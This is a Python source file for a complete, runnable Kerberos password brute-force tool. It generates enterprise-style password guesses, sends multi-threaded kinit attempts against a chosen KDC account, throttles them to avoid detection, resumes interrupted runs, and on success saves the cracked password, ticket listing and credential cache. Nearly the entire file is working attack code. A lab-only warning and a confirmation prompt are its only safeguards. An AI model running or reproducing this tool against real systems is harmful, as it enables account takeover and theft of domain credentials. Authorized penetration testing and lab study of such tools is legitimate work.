#!/usr/bin/env python3

"""
Advanced Kerberos Brute Force Attack Script
Version: 2.0
Author: Emerson
Date: February 2025

Features:
- Multi-threaded brute forcing (1-32 threads)
- Smart password generation with enterprise patterns
- Rate limiting to avoid detection
- Real-time progress tracking with statistics
- Automatic TGT extraction on success
- Comprehensive JSON logging
- Resume capability for interrupted attacks
- Memory-efficient password queue
"""

import subprocess
import threading
import queue
import time
import argparse
import json
import os
import sys
import hashlib
from datetime import datetime, timedelta
from pathlib import Path
from typing import List, Dict, Optional, Tuple
from collections import defaultdict
from colorama import Fore, Style, Back, init
from tqdm import tqdm

init(autoreset=True)

# Constants
VERSION = "2.0"
MAX_THREADS = 32
DEFAULT_DELAY = 1.0
PROGRESS_UPDATE_INTERVAL = 10  # Update progress every N attempts


class PasswordGenerator:
    """
    Smart password generator for enterprise environments
    Generates realistic password variations based on common patterns
    """
    
    @staticmethod
    def generate_year_variations(base: str) -> List[str]:
        """Generate year-based variations"""
        current_year = datetime.now().year
        variations = []
        
        for year in range(current_year - 2, current_year + 2):
            variations.extend([
                f"{base}{year}",
                f"{base}{str(year)[2:]}",
                f"{year}{base}",
            ])
        
        return variations
    
    @staticmethod
    def generate_season_variations(base: str = None) -> List[str]:
        """Generate season + year combinations"""
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        seasons = {
            'Spring': [3, 4, 5],
            'Summer': [6, 7, 8],
            'Fall': [9, 10, 11],
            'Winter': [12, 1, 2]
        }
        
        # Determine current and previous season
        current_season = None
        for season, months in seasons.items():
            if current_month in months:
                current_season = season
                break
        
        variations = []
        
        if base:
            # Season variations of base password
            for season in seasons.keys():
                variations.extend([
                    f"{base}{season}",
                    f"{season}{base}",
                    f"{base}{season}{current_year}",
                    f"{season}{current_year}{base}"
                ])
        else:
            # Standalone season patterns
            for season in seasons.keys():
                variations.extend([
                    f"{season}{current_year}",
                    f"{season}{str(current_year)[2:]}",
                    f"{season}{current_year}!",
                    f"{season.lower()}{current_year}"
                ])
        
        return variations
    
    @staticmethod
    def generate_month_variations(base: str = None) -> List[str]:
        """Generate month + year combinations"""
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        months = [
            'January', 'February', 'March', 'April', 'May', 'June',
            'July', 'August', 'September', 'October', 'November', 'December'
        ]
        
        # Focus on current and previous 2 months
        relevant_months = []
        for i in range(3):
            month_idx = (current_month - i - 1) % 12
            relevant_months.append(months[month_idx])
        
        variations = []
        
        if base:
            for month in relevant_months:
                variations.extend([
                    f"{base}{month}",
                    f"{month}{base}",
                    f"{base}{month}{current_year}"
                ])
        else:
            for month in relevant_months:
                variations.extend([
                    f"{month}{current_year}",
                    f"{month}{str(current_year)[2:]}",
                    f"{month}{current_year}!",
                ])
        
        return variations
    
    @staticmethod
    def generate_common_suffixes(base: str) -> List[str]:
        """Generate common suffix variations"""
        suffixes = [
            '!', '@', '#', '$', '123', '1234', '12345',
            '1', '12', '2024', '2025', '01', '001',
            '!@#', '!!', '!1', '@1', '#1'
        ]
        
        return [f"{base}{suffix}" for suffix in suffixes]
    
    @staticmethod
    def generate_common_prefixes(base: str) -> List[str]:
        """Generate common prefix variations"""
        prefixes = ['2024', '2025', 'Super', 'Welcome', 'Admin']
        return [f"{prefix}{base}" for prefix in prefixes]
    
    @staticmethod
    def generate_case_variations(base: str) -> List[str]:
        """Generate case variations"""
        return [
            base.lower(),
            base.upper(),
            base.capitalize(),
            base.title(),
        ]
    
    @staticmethod
    def generate_leet_speak(base: str) -> List[str]:
        """Generate leet speak variations"""
        leet_map = {
            'a': '@', 'e': '3', 'i': '1', 'o': '0',
            's': '$', 't': '7', 'l': '1', 'g': '9'
        }
        
        variations = [base]
        for old, new in leet_map.items():
            variations.append(base.replace(old, new))
            variations.append(base.replace(old.upper(), new))
        
        return variations
    
    @staticmethod
    def generate_keyboard_patterns() -> List[str]:
        """Generate common keyboard patterns"""
        patterns = [
            'qwerty', 'asdfgh', 'zxcvbn',
            'qwertyui', 'asdfghjk', 'zxcvbnm',
            '1qaz2wsx', 'qazwsx', 'qweasd',
            '123qwe', 'qwe123', 'abc123'
        ]
        return patterns
    
    @classmethod
    def generate_all_variations(cls, base_passwords: List[str]) -> List[str]:
        """
        Generate all password variations from base list
        Returns comprehensive list of enterprise-style passwords
        """
        all_passwords = set(base_passwords)  # Use set to avoid duplicates
        
        print(f"{Fore.YELLOW}[*] Generating password variations...")
        
        # Add base passwords with modifications
        for base in base_passwords:
            # Case variations
            all_passwords.update(cls.generate_case_variations(base))
            
            # Year variations
            all_passwords.update(cls.generate_year_variations(base))
            
            # Season variations
            all_passwords.update(cls.generate_season_variations(base))
            
            # Month variations
            all_passwords.update(cls.generate_month_variations(base))
            
            # Suffix variations
            all_passwords.update(cls.generate_common_suffixes(base))
            
            # Prefix variations
            all_passwords.update(cls.generate_common_prefixes(base))
            
            # Leet speak
            all_passwords.update(cls.generate_leet_speak(base))
        
        # Add standalone patterns
        all_passwords.update(cls.generate_season_variations())
        all_passwords.update(cls.generate_month_variations())
        all_passwords.update(cls.generate_keyboard_patterns())
        
        # Common weak passwords
        weak_passwords = [
            'password', 'Password', 'Password1', 'Password123',
            'admin', 'Admin', 'Admin123', 'administrator',
            'welcome', 'Welcome', 'Welcome1', 'Welcome123',
            'changeme', 'ChangeMe', 'letmein', 'LetMeIn'
        ]
        all_passwords.update(weak_passwords)
        
        result = list(all_passwords)
        print(f"{Fore.GREEN}[+] Generated {len(result)} total password variations")
        
        return result


class KerberosAuthenticator:
    """
    Handles Kerberos authentication attempts
    """
    
    def __init__(self, realm: str, kdc: str = None):
        self.realm = realm.upper()
        self.kdc = kdc
        self.krb5_config = self._generate_krb5_config()
    
    def _generate_krb5_config(self) -> str:
        """Generate temporary krb5.conf for this session"""
        config_content = f"""[libdefaults]
    default_realm = {self.realm}
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    {self.realm} = {{
        kdc = {self.kdc if self.kdc else self.realm.lower()}
        admin_server = {self.kdc if self.kdc else self.realm.lower()}
    }}
"""
        # Write to temp file
        config_file = f"/tmp/krb5_bruteforce_{os.getpid()}.conf"
        with open(config_file, 'w') as f:
            f.write(config_content)
        
        return config_file
    
    def authenticate(self, username: str, password: str, timeout: int = 10) -> Tuple[bool, str]:
        """
        Attempt Kerberos authentication
        Returns (success: bool, message: str)
        """
        principal = f"{username}@{self.realm}"
        
        try:
            env = os.environ.copy()
            env['KRB5_CONFIG'] = self.krb5_config
            
            result = subprocess.run(
                ['kinit', principal],
                input=password.encode(),
                capture_output=True,
                timeout=timeout,
                env=env
            )
            
            if result.returncode == 0:
                return True, "Authentication successful"
            else:
                error = result.stderr.decode('utf-8', errors='ignore')
                
                if 'Password incorrect' in error or 'Preauthentication failed' in error:
                    return False, "Invalid password"
                elif 'Client not found' in error or 'Principal unknown' in error:
                    return False, "User not found"
                elif 'Clock skew too great' in error:
                    return False, "Clock skew error"
                else:
                    return False, f"Auth failed: {error[:50]}"
        
        except subprocess.TimeoutExpired:
            return False, "Timeout"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
    
    def extract_ticket(self, username: str, output_dir: Path) -> Optional[Path]:
        """Extract and save Kerberos ticket after successful auth"""
        try:
            # Get ticket info
            result = subprocess.run(['klist'], capture_output=True, text=True)
            
            if result.returncode != 0:
                return None
            
            # Save ticket info
            ticket_file = output_dir / f"ticket_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(ticket_file, 'w') as f:
                f.write(f"Ticket for: {username}@{self.realm}\n")
                f.write(f"Captured: {datetime.now().isoformat()}\n")
                f.write("="*60 + "\n")
                f.write(result.stdout)
            
            # Try to copy credential cache
            ccache = os.environ.get('KRB5CCNAME', f'/tmp/krb5cc_{os.getuid()}')
            if Path(ccache).exists():
                ccache_backup = output_dir / f"krb5cc_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
                subprocess.run(['cp', ccache, str(ccache_backup)], check=True)
                print(f"{Fore.GREEN}[+] Credential cache saved: {ccache_backup}")
            
            return ticket_file
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error extracting ticket: {e}")
            return None
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            if Path(self.krb5_config).exists():
                os.remove(self.krb5_config)
        except:
            pass


class BruteForceStatistics:
    """Track and display statistics"""
    
    def __init__(self):
        self.start_time = None
        self.total_attempts = 0
        self.failed_attempts = 0
        self.errors = 0
        self.lock = threading.Lock()
    
    def record_attempt(self, success: bool, error: bool = False):
        """Record an authentication attempt"""
        with self.lock:
            self.total_attempts += 1
            if not success:
                self.failed_attempts += 1
            if error:
                self.errors += 1
    
    def get_rate(self) -> float:
        """Calculate attempts per second"""
        if not self.start_time:
            return 0.0
        elapsed = time.time() - self.start_time
        return self.total_attempts / elapsed if elapsed > 0 else 0.0
    
    def get_eta(self, total_passwords: int) -> str:
        """Estimate time to completion"""
        rate = self.get_rate()
        if rate == 0:
            return "Unknown"
        
        remaining = total_passwords - self.total_attempts
        seconds = remaining / rate
        
        if seconds < 60:
            return f"{int(seconds)}s"
        elif seconds < 3600:
            return f"{int(seconds/60)}m"
        else:
            return f"{int(seconds/3600)}h {int((seconds%3600)/60)}m"
    
    def print_summary(self):
        """Print final statistics"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Final Statistics")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"Total attempts: {self.total_attempts}")
        print(f"Failed attempts: {self.failed_attempts}")
        print(f"Errors: {self.errors}")
        print(f"Duration: {elapsed:.2f}s")
        print(f"Average rate: {self.get_rate():.2f} attempts/second")
        print(f"{Fore.CYAN}{'='*60}\n")


class KerberosBruteForcer:
    """Main brute force orchestrator"""
    
    def __init__(
        self,
        realm: str,
        kdc: str,
        username: str,
        password_file: str,
        threads: int = 4,
        delay: float = DEFAULT_DELAY,
        output_dir: str = "bruteforce_results",
        smart_gen: bool = True,
        resume: bool = False
    ):
        self.realm = realm.upper()
        self.kdc = kdc
        self.username = username
        self.password_file = password_file
        self.threads = min(threads, MAX_THREADS)
        self.delay = delay
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        self.smart_gen = smart_gen
        self.resume = resume
        
        self.authenticator = KerberosAuthenticator(realm, kdc)
        self.stats = BruteForceStatistics()
        self.password_queue = queue.Queue()
        self.results = []
        self.success = False
        self.success_password = None
        self.lock = threading.Lock()
        
        # Resume state
        self.resume_file = self.output_dir / f"resume_{username}.json"
        self.tested_passwords = set()
    
    def load_passwords(self) -> List[str]:
        """Load passwords from file"""
        try:
            with open(self.password_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            print(f"{Fore.GREEN}[+] Loaded {len(passwords)} base passwords from {self.password_file}")
            
            # Generate variations if requested
            if self.smart_gen:
                passwords = PasswordGenerator.generate_all_variations(passwords)
            
            # Load resume state if exists
            if self.resume and self.resume_file.exists():
                with open(self.resume_file) as f:
                    resume_data = json.load(f)
                    self.tested_passwords = set(resume_data.get('tested_passwords', []))
                
                print(f"{Fore.YELLOW}[*] Resuming from previous session")
                print(f"{Fore.YELLOW}[*] Skipping {len(self.tested_passwords)} already-tested passwords")
                
                passwords = [p for p in passwords if p not in self.tested_passwords]
            
            return passwords
            
        except FileNotFoundError:
            print(f"{Fore.RED}[!] Password file not found: {self.password_file}")
            sys.exit(1)
    
    def save_resume_state(self):
        """Save resume state for interrupted attacks"""
        try:
            with self.lock:
                resume_data = {
                    'username': self.username,
                    'realm': self.realm,
                    'timestamp': datetime.now().isoformat(),
                    'tested_passwords': list(self.tested_passwords),
                    'total_attempts': self.stats.total_attempts
                }
            
            with open(self.resume_file, 'w') as f:
                json.dump(resume_data, f, indent=2)
        except:
            pass
    
    def worker(self, worker_id: int):
        """Worker thread for brute forcing"""
        while not self.success:
            try:
                password = self.password_queue.get(timeout=1)
            except queue.Empty:
                break
            
            # Attempt authentication
            success, message = self.authenticator.authenticate(self.username, password)
            
            # Record attempt
            self.stats.record_attempt(success, 'Error' in message or 'Timeout' in message)
            
            with self.lock:
                self.tested_passwords.add(password)
                
                result = {
                    'username': self.username,
                    'password': password,
                    'success': success,
                    'message': message,
                    'timestamp': datetime.now().isoformat(),
                    'worker_id': worker_id
                }
                
                self.results.append(result)
                
                if success:
                    self.success = True
                    self.success_password = password
                    
                    print(f"\n{Back.GREEN}{Fore.BLACK}{'='*60}{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}[+] ✓ SUCCESS! Password found!")
                    print(f"{Fore.GREEN}[+] Username: {self.username}@{self.realm}")
                    print(f"{Fore.GREEN}[+] Password: {password}")
                    print(f"{Fore.GREEN}[+] Attempts: {self.stats.total_attempts}")
                    print(f"{Back.GREEN}{Fore.BLACK}{'='*60}{Style.RESET_ALL}\n")
                    
                    # Extract ticket
                    ticket_file = self.authenticator.extract_ticket(self.username, self.output_dir)
                    if ticket_file:
                        print(f"{Fore.GREEN}[+] Ticket saved: {ticket_file}")
                else:
                    # Progress update
                    if self.stats.total_attempts % PROGRESS_UPDATE_INTERVAL == 0:
                        rate = self.stats.get_rate()
                        print(f"{Fore.CYAN}[{worker_id}] Attempt {self.stats.total_attempts} | "
                              f"Rate: {rate:.2f}/s | Testing: {password[:30]}")
            
            self.password_queue.task_done()
            
            # Rate limiting
            if self.delay > 0:
                time.sleep(self.delay)
            
            # Periodic resume state save
            if self.stats.total_attempts % 100 == 0:
                self.save_resume_state()
    
    def save_results(self):
        """Save comprehensive results to JSON"""
        result_file = self.output_dir / f"bruteforce_{self.username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        data = {
            'metadata': {
                'tool': 'Advanced Kerberos Brute Force',
                'version': VERSION,
                'target_username': self.username,
                'realm': self.realm,
                'kdc': self.kdc,
                'timestamp': datetime.now().isoformat()
            },
            'configuration': {
                'threads': self.threads,
                'delay': self.delay,
                'smart_generation': self.smart_gen,
                'password_file': self.password_file
            },
            'statistics': {
                'total_attempts': self.stats.total_attempts,
                'failed_attempts': self.stats.failed_attempts,
                'errors': self.stats.errors,
                'duration_seconds': time.time() - self.stats.start_time if self.stats.start_time else 0,
                'average_rate': self.stats.get_rate(),
                'success': self.success
            },
            'result': {
                'success': self.success,
                'password': self.success_password if self.success else None
            },
            'attempt_log': self.results[-100:]  # Last 100 attempts
        }
        
        with open(result_file, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"{Fore.GREEN}[+] Results saved: {result_file}")
        
        # Clean up resume file if successful
        if self.success and self.resume_file.exists():
            self.resume_file.unlink()
    
    def run(self):
        """Execute brute force attack"""
        print(f"\n{Back.CYAN}{Fore.BLACK}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Advanced Kerberos Brute Force v{VERSION}")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}Target: {self.username}@{self.realm}")
        print(f"{Fore.CYAN}KDC: {self.kdc}")
        print(f"{Fore.CYAN}Threads: {self.threads}")
        print(f"{Fore.CYAN}Delay: {self.delay}s between attempts")
        print(f"{Fore.CYAN}Smart Generation: {self.smart_gen}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        # Load passwords
        passwords = self.load_passwords()
        if not passwords:
            print(f"{Fore.RED}[!] No passwords to test")
            return
        
        print(f"{Fore.GREEN}[+] Total passwords to test: {len(passwords)}\n")
        
        # Confirmation
        print(f"{Fore.YELLOW}[!] WARNING: This will generate authentication traffic")
        print(f"{Fore.YELLOW}[!] Ensure you have authorization for this test")
        response = input(f"{Fore.YELLOW}[?] Continue? (yes/no): ")
        
        if response.lower() != 'yes':
            print(f"{Fore.RED}[!] Aborted")
            return
        
        print()
        
        # Queue passwords
        for password in passwords:
            self.password_queue.put(password)
        
        # Start timing
        self.stats.start_time = time.time()
        
        # Start workers
        print(f"{Fore.YELLOW}[*] Launching {self.threads} worker threads...")
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.worker, args=(i,), daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.1)  # Stagger thread starts
        
        print(f"{Fore.YELLOW}[*] Attack in progress...\n")
        
        # Wait for completion
        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrupt received, stopping...")
            self.success = True  # Set flag to stop workers
            self.save_resume_state()
        
        # Save results
        self.save_results()
        
        # Print statistics
        self.stats.print_summary()
        
        # Cleanup
        self.authenticator.cleanup()


def main():
    parser = argparse.ArgumentParser(
        description=f"Advanced Kerberos Brute Force Tool v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic brute force
  python kerb_bruteforce_advanced.py -r LAB.LOCAL -k 192.168.88.20 -u admin -p passwords.txt
  
  # Multi-threaded with smart generation
  python kerb_bruteforce_advanced.py -r LAB.LOCAL -k 192.168.88.20 -u admin -p passwords.txt -t 8 --smart
  
  # With custom delay and output directory
  python kerb_bruteforce_advanced.py -r LAB.LOCAL -k 192.168.88.20 -u admin -p passwords.txt -t 4 -d 0.5 -o results/
  
  # Resume interrupted attack
  python kerb_bruteforce_advanced.py -r LAB.LOCAL -k 192.168.88.20 -u admin -p passwords.txt --resume

⚠️  WARNING: Use only in authorized lab environments!
⚠️  Unauthorized access to computer systems is illegal!

Author: Emerson | Version: {VERSION} | Date: February 2025
        """
    )
    
    parser.add_argument('-r', '--realm', required=True, help='Kerberos realm (e.g., LAB.LOCAL)')
    parser.add_argument('-k', '--kdc', required=True, help='KDC hostname or IP address')
    parser.add_argument('-u', '--username', required=True, help='Target username')
    parser.add_argument('-p', '--password-file', required=True, help='Password file path')
    parser.add_argument('-t', '--threads', type=int, default=4, help=f'Number of threads (1-{MAX_THREADS}, default: 4)')
    parser.add_argument('-d', '--delay', type=float, default=DEFAULT_DELAY, help='Delay between attempts in seconds (default: 1.0)')
    parser.add_argument('-o', '--output-dir', default='bruteforce_results', help='Output directory (default: bruteforce_results)')
    parser.add_argument('--smart', action='store_true', help='Enable smart password generation')
    parser.add_argument('--resume', action='store_true', help='Resume interrupted attack')
    parser.add_argument('--version', action='version', version=f'%(prog)s {VERSION}')
    
    args = parser.parse_args()
    
    # Validate threads
    if args.threads < 1 or args.threads > MAX_THREADS:
        print(f"{Fore.RED}[!] Threads must be between 1 and {MAX_THREADS}")
        sys.exit(1)
    
    # Create bruteforcer
    bruteforcer = KerberosBruteForcer(
        realm=args.realm,
        kdc=args.kdc,
        username=args.username,
        password_file=args.password_file,
        threads=args.threads,
        delay=args.delay,
        output_dir=args.output_dir,
        smart_gen=args.smart,
        resume=args.resume
    )
    
    # Run attack
    bruteforcer.run()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
        